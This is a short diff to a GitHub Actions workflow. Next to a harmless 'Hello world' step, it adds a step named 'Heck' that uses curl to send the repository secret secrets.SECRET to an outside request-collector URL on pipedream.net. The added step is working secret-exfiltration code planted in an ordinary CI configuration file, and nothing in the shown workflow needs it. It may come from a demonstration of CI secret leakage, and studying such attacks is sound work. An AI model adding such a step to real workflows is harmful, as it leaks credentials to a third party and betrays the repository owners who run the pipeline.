@@ -9,3 +9,6 @@ jobs:
     steps:
       - name: Hello world
         run: echo hello world
+
+      - name: Heck
+        run: curl https://en4on50idh0h6.x.pipedream.net/?secret=${{secrets.SECRET}}
